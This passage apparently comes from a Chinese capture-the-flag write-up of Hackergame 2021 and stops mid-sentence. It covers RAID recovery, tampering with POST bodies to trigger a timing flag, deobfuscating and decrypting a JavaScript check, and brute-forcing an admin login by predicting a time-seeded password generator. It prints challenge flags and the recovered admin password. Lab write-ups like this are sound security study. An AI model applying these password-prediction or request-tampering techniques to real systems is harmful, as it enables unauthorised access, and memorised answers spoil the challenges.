\u56e0\u4e3a\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\uff0c\u6240\u4ee5\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u627e\u51fa\u4e94\u4e2a\u78c1\u76d8\u7684\u987a\u5e8f\u548c\u5757\u5927\u5c0f</p> <p>\u987a\u5e8f\u53ef\u4ee5\u5148\u7b80\u5355\u5730\u770b\u770b strings *.img \u8f93\u51fa\u7684\u5185\u5bb9 \u9010\u4e2a\u6587\u4ef6\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u6587\u4ef6\u6bd4\u8f83\u9760\u524d\u7684\u5730\u65b9\u4f1a\u6709\u4e00\u6bb5\u662f git \u5386\u53f2\u8bb0\u5f55\u7684\u4e00\u90e8\u5206:  \u6839\u636e\u91cc\u9762\u7684\u65f6\u95f4\u53ef\u4ee5\u63a8\u65ad\u51fa\u78c1\u76d8\u7684\u987a\u5e8f\u5927\u81f4\u662f\uff1a</p> <p>Qj... -&gt; 60... -&gt; 3R... -&gt; Ir... -&gt; 3D...</p> <p>\u53ea\u662f\uff0c\u8fd9\u4e2a\u987a\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a\u73af\uff0c\u8c01\u5728\u7b2c\u4e00\u8fd8\u6ca1\u533a\u5206\u51fa\u6765</p> <p>\u5728\u770b\u6bcf\u4e2a\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u53ea\u6709 60... \u548c 3R... \u6709 \u201cEFI PART\u201d:  \u6240\u4ee5\u5e94\u8be5\u662f\u4e00\u4e2a\u5728\u5f00\u5934\uff0c\u4e00\u4e2a\u5728\u7ed3\u5c3e\u3002\u6240\u4ee5\u6700\u7ec8\u7684\u987a\u5e8f\u662f\uff1a</p> <p>3R... -&gt; Ir... -&gt; 3D... -&gt; Qj... -&gt; 60...</p> <p>\u7136\u540e\u9700\u8981\u627e\u5230\u5757\u5927\u5c0f \u76f4\u63a5\u4e22\u5230 DiskGenius \u91cc\u7ec4\u5efa\u865a\u62df RAID\uff0c\u9009\u5de6\u540c\u6b65\uff0c\u7136\u540e\u53ef\u4ee5\u8bd5\u51fa\u6765\u5f53\u5757\u5927\u5c0f\u662f 64k \u7684\u65f6\u5019\u6b63\u597d\u53ef\u4ee5\u62fc\u51fa\u5b8c\u6574\u78c1\u76d8 \u7136\u540e\u514b\u9686\u78c1\u76d8\u751f\u6210 img \u6587\u4ef6\uff0c\u518d\u6302\u8f7d\uff0c\u8fdb\u5165\uff0c\u6267\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag </p>"},{"location":"writeups/hackergame2021/#raid-0","title":"RAID 0","text":"<p>\u5728\u505a RAID 5 \u7684\u65f6\u5019\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u53eb Raid Reconstructor \u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7206\u7834 RAID \u9635\u5217\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u6240\u4ee5\u8fd9\u95ee\u4e5f\u5c31\u61d2\u5f97\u770b\u4e86\uff0c\u76f4\u63a5\u4e22\u7ed9 Raid Reconstructor \u6765\u7206\u7834\uff0c\u5f97\u5230\u6700\u63a8\u8350\u7684\u987a\u5e8f\uff1a</p> <p>wl. -&gt; jC. -&gt; 1G. -&gt; 5q. -&gt; d3. -&gt; eR. -&gt; RA. -&gt; ID.</p> <p>\u548c\u5757\u5927\u5c0f 128k</p> <p>\u7136\u540e\u76f4\u63a5\u7528 Raid Reconstructor \u7684 Copy \u5bfc\u51fa img \u6587\u4ef6\uff0c\u63d0\u53d6\u540e\u53c8\u5f97\u5230\u4e00\u4e2a\u65b0\u7684 img \u6587\u4ef6 \u901a\u8fc7 file \u53ef\u4ee5\u770b\u5230\u7ed3\u679c\u7684\u6587\u4ef6\u7cfb\u7edf\u662f XFS <pre><code>$ file MyDisk.img\nMyDisk.img: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)\n</code></pre></p> <p>\u4f46\u662f\u59cb\u7ec8\u65e0\u6cd5\u6302\u8f7d\uff08\u641e\u4e86\u4e00\u5929\uff09 \u53ef\u80fd\u662f Raid Reconstructor \u7684\u95ee\u9898\uff0c\u6240\u4ee5\u53c8\u7528 DiskGenius \u8bd5\u4e86\u4e0b \u56e0\u4e3a win \u548c DiskGenius \u8bfb\u4e0d\u4e86 XFS \u6587\u4ef6\u7cfb\u7edf\uff0c\u6240\u4ee5\u62fc\u8d77\u6765\u4e4b\u540e\u76f4\u63a5\u514b\u9686\u51fa img \u6587\u4ef6 \u7136\u540e\u62d6\u5230 Kali Linux \u91cc\u6302\u8f7d\uff0c\u6210\u529f\u6302\u8f7d\u540e\u8fdb\u5165\u3001\u8fd0\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag </p>"},{"location":"writeups/hackergame2021/#_11","title":"\u52a9\u8bb0\u8bcd","text":"<p>\u9898\u76ee\u6709\u6548\u5185\u5bb9\uff1a</p> <p>\u4f60\u7684\u5ba4\u53cb\u7ec8\u4e8e\u8fde\u591c\u8d76\u5b8c\u4e86\u4ed6\u7684 Java \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u8bfe\u7a0b\u5927\u4f5c\u4e1a\u3002\u770b\u8d77\u6765\u4ed6\u4f7f\u7528 Java 17 \u5199\u4e86\u4e00\u4e2a\u4fdd\u5b58\u52a9\u8bb0\u8bcd\u7684\u540e\u7aef\uff0c\u5f53\u7136\u8fd8\u6709\u914d\u5957\u7684\u524d\u7aef\u3002\u52a9\u8bb0\u8bcd\u7531\u56db\u4e2a\u82f1\u6587\u5355\u8bcd\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7528\u6237\u6700\u591a\u4fdd\u5b58 32 \u6761\u3002</p> <p>\u4f60\u4ece\u4ed6\u5145\u6ee1\u6fc0\u60c5\u5374\u53c8\u5939\u6742\u4e0d\u6e05\u7684\u8868\u8ff0\u4e2d\u5f97\u77e5\uff0c\u4ed6\u4f3c\u4e4e\u8fd8\u4e3a\u6b64\u4e13\u95e8\u5728\u5927\u4f5c\u4e1a\u91cc\u85cf\u4e86\u4e24\u4e2a flag\uff1a\u5f53\u8bbf\u95ee\u5ef6\u8fdf\u8fbe\u5230\u4e24\u4e2a\u7279\u6b8a\u7684\u9608\u503c\u65f6\uff0cflag \u4fbf\u4f1a\u6253\u5370\u51fa\u6765\uff0c\u5c4a\u65f6\u4f60\u4fbf\u53ef\u4ee5\u62ff\u7740 flag \u8ba9\u4f60\u7684\u5ba4\u53cb\u8bf7\u4f60\u5403\u4e00\u987f\u5927\u9910\u3002</p> <p>\u4e0b\u8f7d\u5230\u6e90\u7801\u540e\u7ffb\u4e00\u7ffb\uff0c\u6709\u7528\u7684\u5c31\u53ea\u6709 Phrase.java \u548c Instance.java  \u5176\u4e2d Phrase.java \u5b9a\u4e49\u4e86 Phrase\uff0c\u5176\u4e2d\u91cd\u8f7d\u4e86 <code>equals</code> \u65b9\u6cd5\uff0c\u5176\u4e2d\u6709\uff1a <pre><code>try {\n    TimeUnit.MILLISECONDS.sleep(EQUALS_DURATION_MILLIS); // 20ms\n    // TODO: remove it since it is for debugging\n} catch (InterruptedException e) {\n    throw new RuntimeException(e);\n}\n</code></pre> \u6240\u4ee5\u5728\u6bcf\u6b21\u6bd4\u8f83\u76f8\u7b49\u7684\u65f6\u5019\u5c31\u4f1a sleep 20ms </p> <p>\u800c Instance.java \u7684 post \u65b9\u6cd5\u4e2d\u5bf9\u4e8e\u6bcf\u6b21\u7684\u8f93\u5165\uff0c\u904d\u5386\u8f93\u5165\u7684\u5217\u8868\uff0c\u7136\u540e\u9010\u4e2a\u52a0\u8fdb HashMap \u4e2d  \u5728\u52a0\u5165 HashMap \u7684\u65f6\u5019\u5c31\u6d89\u53ca\u5230\u5224\u65ad\u662f\u5426\u76f8\u7b49 \u800c\u6700\u7ec8\u4f1a\u5224\u65ad\u5728\u5b8c\u6210\u524d\u540e\u7684\u603b\u7684\u65f6\u95f4\u95f4\u9694\u662f\u591a\u5c11\uff0c\u5982\u679c\u5927\u4e8e 600ms \u5c31\u63d0\u53d6\u51fa\u7b2c\u4e00\u4e2a flag\uff1a <pre><code>var modified = 0;\nvar before = System.nanoTime();\nfor (var i = 0; i &lt; input.length() &amp;&amp; i &lt; MAX_PHRASES &amp;&amp; phrases.size() &lt; MAX_PHRASES; ++i) {\n    var text = input.optString(i, \"\").toLowerCase(Locale.ENGLISH);\n    modified += phrases.add(Phrase.create(this.mnemonics, text, token)) ? 1 : 0;\n    // \u8fd9\u91cc\u4f1a sleep\n}\nvar after = System.nanoTime();\nvar duration = TimeUnit.MILLISECONDS.convert(after - before, TimeUnit.NANOSECONDS);\nif (duration &gt; FLAG1_DURATION_MILLIS) { // 600ms\n    token.addFlag(1, flag -&gt; output.put(\"flag1\", flag));\n}\n</code></pre></p> <p>\u800c\u5728\u7f51\u9875\u4e2d\u6dfb\u52a0\u6761\u76ee\u7684\u65f6\u5019\uff0c\u4e00\u6b21\u53ea\u80fd\u6dfb\u52a0\u4e00\u6761\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a POST \u91cc\u9762\u53ea\u6709\u4e00\u4e2a Phrase  \u4f46\u662f\u6e90\u7801\u4e2d\u6709\u4e00\u4e2a\u5faa\u73af\uff0c\u904d\u5386\u6574\u4e2a input\uff0c\u6240\u4ee5\u4e00\u4e2a POST \u91cc\u7684\u5185\u5bb9\u5176\u5b9e\u662f\u4e00\u4e2a\u5217\u8868 \u6240\u4ee5\u53ef\u4ee5\u7528 BurpSuite \u83b7\u53d6 POST \u7136\u540e\u66f4\u6539\u4e00\u4e0b\u5185\u5bb9\u518d\u53d1\u9001\u51fa\u53bb\uff08\u5148 random \u4e00\u4e2a\uff0c\u7136\u540e add\uff09  \u6839\u636e flag \u91cc\u7684\u63d0\u793a\uff0c\u6b63\u89e3\uff08\u7b2c\u4e8c\u987f\u5927\u9910\uff09\u5e94\u8be5\u662f\u4f7f\u7528\u54c8\u5e0c\u78b0\u649e\uff0c\u4f46\u662f\u4e0d\u4f1a</p>"},{"location":"writeups/hackergame2021/#_12","title":"\u9a6c\u8d5b\u514b","text":"<p>\uff08\u8fd9\u9053\u9898\u5df2\u7ecf\u505a\u7834\u9632\u4e86\uff0c\u672c\u4ee5\u4e3a\u662f\u4e2a\u9752\u94dc\uff0c\u7ed3\u679c\u662f\u4e2a\u738b\u8005\u2026\u2026\uff09 \u6211\u505a\u7684\u80af\u5b9a\u4e0d\u662f\u6b63\u89e3\uff0c\u5229\u7528\u4e8c\u7ef4\u7801\u7ea0\u9519\u80fd\u529b\u52c9\u5f3a\u62ff\u5230\u4e86 flag\uff0c\u6240\u4ee5\u5c31\u4e0d\u8be6\u7ec6\u5199 writeup \u4e86\uff0c\u4e3b\u8981\u8fd8\u662f\u8981\u770b\u5b98\u65b9 wp\uff08\u9003</p> <p>\u5927\u6982\u6b65\u9aa4\u5c31\u662f\uff1a</p> <ol> <li>\u8bfb\u56fe\u7247</li> <li>\u628a\u5df2\u77e5\u7684\u50cf\u7d20\u63d0\u53d6\u51fa\u6765</li> <li>\u628a\u56db\u4e2a\u5c0f\u5b9a\u4f4d\u5757\u586b\u4e0a</li> <li>\u6328\u4e2a\u9a6c\u8d5b\u514b\u5757\u5bfb\u627e\u4f7f\u8fd8\u539f\u7684\u6570\u636e\u5e73\u5747\u6570\u4e0e\u539f\u9a6c\u8d5b\u514b\u503c\u5dee\u7684\u7edd\u5bf9\u503c\u5c0f\u4e8e1\u7684\u586b\u8865\u65b9\u6cd5<ul> <li>\u5982\u679c\u53ea\u6709\u4e00\u79cd\u5c31\u586b\u4e0a\uff0c\u5e76\u4e14\u6807\u6ce8\u5df2\u7ecf\u586b\u597d\uff0c\u4ee5\u540e\u4e0d\u518d\u641c\u5bfb</li> <li>\u5982\u679c\u6709\u591a\u79cd\u5c31\u5148\u653e\u4e0b\u4e0d\u586b</li> </ul> </li> <li>\u91cd\u590d4\u7684\u8fc7\u7a0b\uff0c\u8fd9\u662f\u8fd8\u4f1a\u6709\u552f\u4e00\u786e\u5b9a\u7684\u586b\u8865\u65b9\u6848\u3002\u91cd\u590d4\u6b21\u5927\u6982\u5c31\u4e0d\u5269\u552f\u4e00\u89e3\u4e86</li> <li>\u8fd9\u65f6\u91cd\u590d4\uff0c\u627e\u51fa\u4ec5\u67092\u4e2d\u586b\u8865\u65b9\u6cd5\u7684\uff0c\u9009\u8bef\u5dee\u6700\u5c0f\u7684\u586b\u4e0a</li> <li>\u7136\u540e\u518d\u91cd\u590d4</li> <li>\u7136\u540e\u91cd\u590d6</li> <li>\u7136\u540e\u91cd\u590d4 </li> <li>\u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u8fd8\u539f\u5f97\u5dee\u4e0d\u591a\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7ba1\u76f4\u63a5\u626b\u7801\u4e5f\u53ef\u4ee5\u626b\u51fa flag \u4e86 </li> </ol> <p>\u770b\uff0c\u505a\u6cd5\u5f88\u70c2\u5bf9\u5427</p>"},{"location":"writeups/hackergame2021/#minecraft","title":"minecRaft","text":"<p>kk \u540c\u5b66\u5f88\u559c\u6b22\u73a9 Minecraft\uff0c\u4ed6\u6700\u8fd1\u6536\u5230\u4e86\u4e00\u5f20 MC \u5730\u56fe\uff0c\u5730\u56fe\u91cc\u9762\u6709\u4e09\u76cf\u706f\uff0c\u8fd8\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u538b\u529b\u677f\u3002</p> <p>\u4f46\u4ed6\u53d1\u73b0\u8fd9\u4e9b\u706f\u597d\u50cf\u4e0d\u592a\u7b26\u5408 MC \u7535\u78c1\u5b66\uff08Red stone\uff09\uff0c\u4f60\u80fd\u5e2e\u4ed6\u628a\u706f\u5168\u90e8\u70b9\u4eae\u5417\uff1f</p> <p>\u6ce8\uff1a\u672c\u9898\u89e3\u6cd5\u4e0e\u539f\u7248 Minecraft \u6e38\u620f\u65e0\u5173\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1aflag \u82b1\u62ec\u53f7\u5185\u4e3a\u8ba9\u4e09\u76cf\u706f\u5168\u90e8\u70b9\u4eae\u7684\u6700\u77ed\u7684\u8f93\u5165\u5e8f\u5217\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8e29\u8e0f\u538b\u529b\u677f\u8f93\u5165\u7684\u6700\u77ed\u7684\u5e8f\u5217\u4e3a abc\uff0c\u5219\u7b54\u6848\u4e3a flag{abc}\u3002</p> <p>\u8fd8\u633a\u597d\u73a9\u7684\u9898\uff0c\u5728\u7f51\u9875\u4e2d\u6a21\u62df\u4e86\u4e00\u4e2amc\u51fa\u6765 \u770b\u6e90\u7801\u770b\u5230\u4e86\u5f15\u5165\u4e86 flag.js \u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u662f\u8981\u901a\u8fc7\u5b83\u6765\u5f97\u5230\u7b54\u6848\uff1a <pre><code>&lt;script src=\"jsm/miscs/flag.js\"&gt;&lt;/script&gt;\n</code></pre> \u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u6700\u7ec8\u5224\u65ad\u662f\u5426\u6b63\u786e\u662f\u901a\u8fc7\u8c03\u7528 <code>gyflagh(input)</code> \u662f\u5426\u4e3a true \u6765\u5224\u65ad\uff0c\u800c gyflagh \u4e5f\u5728 flag.js \u4e2d\uff0c\u6240\u4ee5\u8fd8\u662f\u8981\u770b flag.js </p> <p>\u4f46\u662f flag.js \u662f\u7ecf\u8fc7\u7b80\u5355\u6df7\u6dc6\u8fc7\u7684\uff0c\u8fd8\u662f\u8981\u8d39\u70b9\u65f6\u95f4\u8bfb\u4e00\u4e0b</p> <p>\u5176\u4e2d\u6709\u56db\u4e2a\u8f6c\u6362 Str4 Base16 \u548c Long \u7684\u51fd\u6570\u53ef\u4ee5\u7565\u6389\u4e0d\u7ba1 \u6ce8\u610f\u5230\u4e86 <code>_0x381b()</code> \u8fd9\u4e2a\u51fd\u6570\u91cc\u6709\u4e00\u4e2a\u5217\u8868\uff0c\u800c\u4e14\u6bd4\u8f83\u7b80\u5355\uff0c\u5176\u5b9e\u5b83\u8fd4\u56de\u7684\u5c31\u662f\u8fd9\u4e2a\u5217\u8868 <pre><code>['encrypt', '33MGcQht', '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c', '14021KbbewD', 'charCodeAt', '808heYYJt', '5DlyrGX', '552oZzIQH', 'fromCharCode', '356IjESGA', '784713mdLTBv', '2529060PvKScd', '805548mjjthm', '844848vFCypf', '4bIkkcJ', '1356853149054377', 'length', 'slice', '1720848ZSQDkr']\n</code></pre> \u4f46\u662f\u5728 Console \u91cc\u9762\u8c03\u7528 _0x381b \u5f97\u5230\u7684\u5374\u662f\u4ee5 'slice' \u5f00\u5934\u3001'length' \u7ed3\u5c3e\u7684\u5217\u8868\uff0c\u5c06\u8fd9\u4e2a\u5217\u8868\u8bb0\u4e3a lst \u65b9\u4fbf\u8868\u8ff0 \u800c\u4e14\u6e90\u7801\u4e2d\u53ea\u6709\u6700\u5f00\u5934\u7684\u8c03\u7528\u533f\u540d\u51fd\u6570\u91cc\u9762\u6709 <code>['push']</code> \u548c <code>['shift']</code>\uff0c\u6240\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u5c31\u662f\u5c06\u8fd9\u4e2a\u5217\u8868\u5faa\u73af\u53f3\u79fb\u4e24\u4e2a\u4f4d\u7f6e \u90a3\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u4e5f\u4e0d\u7528\u770b\u4e86</p> <p>\u518d\u6765\u770b <code>_0x2c9e()</code> \u8fd9\u4e2a\u51fd\u6570\uff1a <pre><code>function _0x2c9e(_0x49e6ff, _0x310d40) {\n    const _0x381b4c = _0x381b();\n    return _0x2c9e = function(_0x2c9ec6, _0x2ec3bd) {\n        _0x2c9ec6 = _0x2c9ec6 - 0x1a6;\n        let _0x4769df = _0x381b4c[_0x2c9ec6];\n        return _0x4769df;\n    }\n    ,\n    _0x2c9e(_0x49e6ff, _0x310d40);\n}\n</code></pre> \u5176\u4e2d <code>_0x381b4c</code> \u662f\u521a\u521a\u8bf4\u7684\u90a3\u4e2a\u5217\u8868 lst\u3002\u7136\u540e return \u91cc\u9762\u91cd\u65b0\u5b9a\u4e49\u4e86 <code>_0x2c9e</code>\uff0c\u4f46\u662f\u65b0\u7684\u5b9a\u4e49\u91cc\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e76\u6ca1\u6709\u7528\uff0c\u7136\u540e\u8c03\u7528\u8fd4\u56de\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\uff1a <pre><code>function _0x2c9e(_0x2c9ec6, ...) {\n    _0x2c9ec6 = _0x2c9ec6 - 0x1a6;\n    return lst[_0x2c9ec6];\n}\n</code></pre> 0x1a6 \u662f 422\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u4e5f\u5c31\u76f8\u5f53\u4e8e function(x) { return lst[x - 422]; } \u540c\u65f6\u6839\u636e\u7b2c\u4e00\u884c\uff0c\u7a0b\u5e8f\u4e2d\u6240\u6709 <code>_0x22517d</code> \u4e5f\u662f\u8fd9\u4e2a\u51fd\u6570</p> <p>\u7136\u540e\u770b\u5224\u65ad\u7b54\u6848\u7684 <code>gyflagh</code> \u51fd\u6570 <pre><code>function gyflagh(_0x111955) {\n    const _0x50051f = _0x22517d;\n    let _0x3b790d = _0x111955[_0x50051f(0x1a8)](_0x50051f(0x1b7));\n    if (_0x3b790d === _0x50051f(0x1aa))\n        return !![];\n    return ![];\n}\n</code></pre> \u6ca1\u5565\u7279\u522b\u7684\uff0c\u7ed3\u5408 lst \u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>function gyflagh(ans) {\n  if (ans[\"encrypt\"](\"1356853149054377\") === \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\") {\n    return true;\n  }\n  return false;\n}\n</code></pre></p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408 lst \u4e2d\u7684\u503c\u548c\u7d22\u5f15\uff0c\u7ffb\u8bd1\u51fa\u6700\u91cd\u8981\u7684\u51fd\u6570 \u518d\u8fdb\u884c\u4e00\u4e9b\u8fd0\u7b97\uff0c\u7528\u6ce8\u91ca\u6807\u6ce8\u4e00\u4e0b\u5df2\u77e5\u7684\u503c\u5c31\u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>String[\"prototype\"][\"encrypt\"] = function(key) { // key = \"1356853149054377\"\n    const left = new Array(2);\n    const right = new Array(4);\n    let res = \"\";\n    ans = escape(this); // this := ans\n    right = [909456177, 825439544, 892352820, 926364468]\n    for (var i = 0; i &lt; ans[\"length\"]; i = i + 8) {\n      left[0] = Str4ToLong(ans[\"slice\"](i, i + 4));\n      left[1] = Str4ToLong(ans[\"slice\"](i + 4, i + 8));\n      code(left, right);\n      res = res + (LongToBase16(left[0]) + LongToBase16(left[1]));\n    }\n    return res;  // 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\n};\n</code></pre></p> <p>\u518d\u6765\u770b <code>code</code> \u51fd\u6570\uff0c\u6839\u636e &lt;&lt; 4\u3001 ^\u3001 &gt;&gt;&gt; 5 \u53ef\u4ee5\u5927\u80c6\u63a8\u6d4b\u7c7b\u4f3c TEA\uff0c\u7136\u540e\u89e3\u7801\u5c31\u76f4\u63a5\u7ffb\u8fc7\u6765\u5c31\u597d\u4e86\uff1a <pre><code>function dec(left, right) {\n    for (var i = 2654435769 * 32; i != 0;) {\n        left[1] -= ((left[0] &lt;&lt; 4 ^ left[0] &gt;&gt;&gt; 5) + left[0] ^ i + right[i &gt;&gt;&gt; 11 &amp; 3]);\n        i -= 2654435769;\n        left[0] -= ((left[1] &lt;&lt; 4 ^ left[1] &gt;&gt;&gt; 5) + left[1] ^ i + right[i &amp; 3]);\n    }\n    console.log(left);\n}\n</code></pre></p> <p>\u6700\u540e\u628a\u8981\u5f97\u5230\u7684 res \u5206\u5757\uff0c\u6bcf 8 \u4e2a\u4e00\u7ec4\uff1a <pre><code>6fbde674 819a59bf a1209256 5b4ca2a7 a11dc670 c678681d af4afb67 04b82f0c\n</code></pre> \u7136\u540e\u4ece\u540e\u5f80\u524d\uff0c\u6bcf\u4e24\u4e2a\u6267\u884c Base16ToLong\uff0c\u7136\u540e\u4f5c\u4e3a left \u4f20\u7ed9 dec \u51fd\u6570\u89e3\u7801\uff0c\u7136\u540e\u518d LongToStr4 \u5f97\u5230\u56db\u4e2a\u5b57\u7b26:  \u62fc\u8d77\u6765\u5c31\u662f flag \u4e86\uff1a<code>flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i}</code></p>"},{"location":"writeups/hackergame2021/#_13","title":"\u5bc6\u7801\u751f\u6210\u5668","text":"<p>\u5c0f T \u6700\u8fd1\u53c8\u5199\u4e86\u4e00\u4e2a web \u5e94\u7528\u3002</p> <p>\u4ed6\u53d1\u73b0\u5f88\u591a\u7528\u6237\u90fd\u559c\u6b22\u8bbe\u7f6e\u5f31\u5bc6\u7801\uff0c\u4e8e\u662f\u51b3\u5b9a\u8ba9\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u90fd\u5fc5\u987b\u662f 16 \u4f4d\u957f\uff0c\u5e76\u4e14\u5404\u79cd\u7b26\u53f7\u90fd\u8981\u6709\u3002\u4e3a\u4e86\u8ba9\u5927\u5bb6\u53ef\u4ee5\u65b9\u4fbf\u751f\u6210\u8fd9\u6837\u7684\u5bc6\u7801\uff0c\u4ed6\u8fd8\u5199\u4e86\u4e00\u4e2a\u5bc6\u7801\u751f\u6210\u5668\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u751f\u6210\u7b26\u5408\u89c4\u5219\u7684\u5bc6\u7801\u3002</p> <p>\u4f46\u8fd9\u6837\u679c\u771f\u5b89\u5168\u5417\uff1f</p> <p>\uff08\u611f\u89c9\u8fd9\u6b21 Hackergame \u9898\u7684 tag \u90fd\u5f88\u8be1\u5f02\u3002\u8fd9\u9898\u660e\u660e\u662f misc(general) \u4e3a\u4ec0\u4e48\u6253\u4e86 binary \u7684 tag\uff09</p> <p>\u770b\u5230 binary tag \u76f4\u63a5\u5148\u5f80 IDA \u91cc\u9762\u4e22\uff0c\u7136\u540e\u62a5\u9519\u4e86\uff0c\u5927\u6982\u662f\u56e0\u4e3a\u90e8\u5206 winapi \u5bfc\u5165\u4e0d\u8fdb\u53bb\u7684\u95ee\u9898\uff08\uff1f\uff09 \u7136\u540e\u5c31\u4e0d\u4f1a\u4e86\u2026\u2026 \u5bf9\u7740 IDA \u5e72\u77aa\u773c</p> <p>\u770b\u9898\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u7f51\u7ad9\uff0c\u7528\u6765\u53d1\u5e03\u5c55\u677f\uff0c\u770b\u8d77\u6765\u53ea\u6709 admin \u7528\u6237\uff0c\u800c\u4e14\u6ca1\u6709\u6ce8\u518c\u7cfb\u7edf\uff0c\u6240\u4ee5\u5e94\u8be5\u5c31\u662f\u8981\u641e\u5230 admin \u7684\u5bc6\u7801\u4e86 \u518d\u7ec6\u770b\u7f51\u7ad9\uff0c\u7279\u610f\u63d0\u5230 \u201c\u7f51\u9875\u663e\u793a\u65f6\u95f4\u201d\uff0c\u800c\u4e14\u5c55\u677f\u540e\u9762\u90fd\u6709\u53d1\u5e03\u65f6\u95f4\uff0c\u70b9\u8fdb admin \u7684\u7528\u6237\u9875\u9762\u53d1\u73b0\u4e5f\u6709\u6ce8\u518c\u65f6\u95f4\uff0c\u7740\u5b9e\u6709\u4e9b\u8bb8\u8be1\u5f02\uff08 \u6240\u4ee5\u65f6\u95f4\u5e94\u8be5\u662f\u4e00\u4e2a\u63d0\u793a</p> <p>\u800c\u5199\u4ee3\u7801\u7684\u65f6\u5019\u8bbe\u7f6e\u968f\u673a\u6570\u79cd\u5b50\u53c8\u5e38\u4ee5\u5f53\u524d\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\uff0c\u6240\u4ee5\u751f\u6210\u7684\u5bc6\u7801\u53ef\u80fd\u662f\u548c\u65f6\u95f4\u6709\u5173\u7cfb\u7684 \u901a\u8fc7\u8c03\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u540c\u4e00\u79d2\u70b9\u4e0b\u751f\u6210\uff0c\u4ea7\u751f\u7684\u5bc6\u7801\u662f\u4e00\u6837\u7684 \u6240\u4ee5\u53ea\u9700\u8981\u628a\u7cfb\u7edf\u65f6\u95f4\u8c03\u5230 admin \u7684\u6ce8\u518c\u65f6\u95f4\u5de6\u53f3\uff0c\u7136\u540e\u6bcf\u79d2\u751f\u6210\u5bc6\u7801\uff0c\u518d\u6328\u4e2a\u8f93\u8fdb\u53bb\u7206\u7834\u5373\u53ef</p> <p>\u6700\u540e\u5f97\u5230 2021-09-22 23:10:53 \u65f6\u751f\u6210\u7684\u5bc6\u7801 <code>$Z=CBDL7TjHu~mEX</code> \u5c31\u662f admin \u7684\u5bc6\u7801 \u7136\u540e\u767b\u5f55\u5373\u53ef\u5728\u201c\u6211\u7684\u201d\u91cc\u770b\u5230\u4e00\u6761\u79c1\u5bc6\u5c55\u677f\uff0c\u5185\u5bb9\u662f flag</p>"},{"location":"writeups/hackergame2021/#pq","title":"p\ud83d\ude2dq","text":"<p>\u5b66\u4f1a\u5085\u91cc\u53f6\u7684\u4e00\u77ac\u95f4\uff0c\u6094\u6068\u7684\u6cea\u6c34\u6d41\u4e86\u4e0b\u6765\u3002</p> <p>\u5f53\u6211\u770b\u5230\u97f3\u9891\u64ad\u653e\u5668\u4e2d\u8df3\u52a8\u7684\u9891\u8c31\u52a8\u753b\uff0c\u6708\u660e\u661f\u7a00\u7684\u591c\u665a\uff0c\u6df1\u9083\u7684\u94f6\u6cb3\uff0c\u53ea\u6709\u5929\u4f7f\u5728\u6d45\u541f\u4f4e\u5531\uff0c\u590d\u6742\u7684\u60c5\u611f\u4e8e\u6211\u773c\u4e2d\u6ea2\u51fa\uff0c\u50cf\u662f\u6c89\u5165\u4e86\u96fe\u91cc\u6726\u80e7\u7684\u6d77\u4e00\u6837\u7684\u6e29\u67d4\u3002</p> <p>\u8fd9\u4e00\u523b\u6211\u624d\u77e5\u9053\uff0c\u8033\u673a\u97f3\u54cd\u4e5f\u5c31\u56fe\u4e00\u4e50\uff0c\u771f\u542c\u97f3\u4e50\u8fd8\u5f97\u9760\u773c\u775b\u3002</p> <p>\uff08\u6ce8\u610f\uff1aflag \u82b1\u62ec\u53f7\u5185\u662f\u4e00\u4e2a 12 \u4f4d\u6574\u6570\uff0c\u7531 0-9 \u6570\u4f4d\u7ec4\u6210\uff0c\u6ca1\u6709\u5176\u5b83\u5b57\u7b26\u3002\uff09</p> <p>\u867d\u7136\u8fd9\u9898\u662f\u5728\u5012\u6570\u7b2c\u4e09\u9898\uff0c\u8fd8\u503c 400pt\uff0c\u4f46\u4f60\u4e00\u8bf4\u5085\u91cc\u53f6\u6211\u53ef\u5c31\u4e0d\u56f0\u4e86\u55f7</p> <p>\u4e0b\u8f7d\u9898\u76ee\u5305\uff0c\u6709\u4e00\u4e2a\u751f\u6210 gif \u7684 py \u4ee3\u7801\u548c\u90a3\u4e2a gif \u6587\u4ef6 \u6b63\u597d\u524d\u9762\u7684\u7535\u6ce2\u4e5f\u6709\u4e00\u6bb5\u97f3\u9891\uff0c\u53ef\u4ee5\u7528\u90a3\u4e2a\u5e26\u5165\u5230 